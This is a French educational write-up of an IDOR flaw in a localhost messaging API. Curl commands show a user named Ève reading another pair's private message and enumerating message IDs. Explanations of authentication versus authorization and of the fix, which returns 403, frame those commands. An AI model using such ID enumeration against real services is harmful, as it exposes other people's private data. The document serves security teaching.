# Exploit par Ève — IDOR (Insecure Direct Object Reference)

Dans cette application, on s'attend à ce que:
- L'identité de l'utilisateur soit déterminée par sa session (SecurityContext)
- Seuls les participants d'une conversation puissent lire leurs messages
- Un utilisateur ne puisse envoyer des messages qu'en son propre nom

L'application corrige les failles du projet 02 : l'expéditeur est forcé
par le SecurityContext et la boîte de réception utilise l'identité de la session.

**Mais** l'endpoint `GET /api/messages/{id}` retourne n'importe quel message
sans vérifier que l'utilisateur connecté en est l'expéditeur ou le destinataire.

## Contexte:

Alice et Bob s'inscrivent. Alice envoie un message privé à Bob.

```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c alice-cookie.txt \
    -d '{
      "nomUtilisateur": "alice",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c bob-cookie.txt \
    -d '{
      "nomUtilisateur": "bob",
      "motDePasse": "password123"
    }' ;
curl -X POST http://localhost:8080/api/messages \
    -H "Content-Type: application/json" \
    -b alice-cookie.txt \
    -d '{
      "destinataire": "bob",
      "contenu": "Salut Bob, on se voit ce soir au resto?"
    }'
```

Ève s'inscrit aussi :
```bash
curl -X POST http://localhost:8080/api/id/signup \
    -H "Content-Type: application/json" \
    -c eve-cookie.txt \
    -d '{
      "nomUtilisateur": "eve",
      "motDePasse": "password123"
    }'
```

## Ce qui est corrigé (par rapport au projet 02) :

1. Ève ne peut plus se faire passer pour Alice à l'envoi
```bash
curl -X POST http://localhost:8080/api/messages \
    -H "Content-Type: application/json" \
    -b eve-cookie.txt \
    -d '{
      "expediteur": "alice",
      "destinataire": "bob",
      "contenu": "Tentative usurpation"
    }'
```
→ Le champ `expediteur` du body est ignoré. Le message est envoyé en tant que « eve ».

2. Ève ne peut plus lire la boîte de réception de Bob
```bash
curl -X GET http://localhost:8080/api/messages \
    -b eve-cookie.txt
```
→ Retourne uniquement les messages d'Ève (liste vide si elle n'en a pas).

## Exploit — IDOR :

Ève peut quand même lire n'importe quel message en devinant/énumérant les IDs :

```bash
curl -X GET http://localhost:8080/api/messages/1 \
    -b eve-cookie.txt
```
→ Retourne le message privé Alice→Bob ! Ève n'est ni l'expéditrice ni la destinataire.

Ève peut énumérer tous les messages de l'application :
```bash
curl -X GET http://localhost:8080/api/messages/1 -b eve-cookie.txt
curl -X GET http://localhost:8080/api/messages/2 -b eve-cookie.txt
curl -X GET http://localhost:8080/api/messages/3 -b eve-cookie.txt
# ... etc.
```

L'application vérifie correctement *qui* fait la requête (identité via SecurityContext),
mais ne vérifie pas si cette personne a le *droit* d'accéder à l'objet demandé.

C'est la différence entre **authentification** (qui es-tu ?) et **autorisation** (as-tu le droit ?).

## Correction dans le projet 04-TestProprio :

```bash
curl -X GET http://localhost:8080/api/messages/1 \
    -b eve-cookie.txt
```
→ 403 Forbidden — Accès refusé ✅
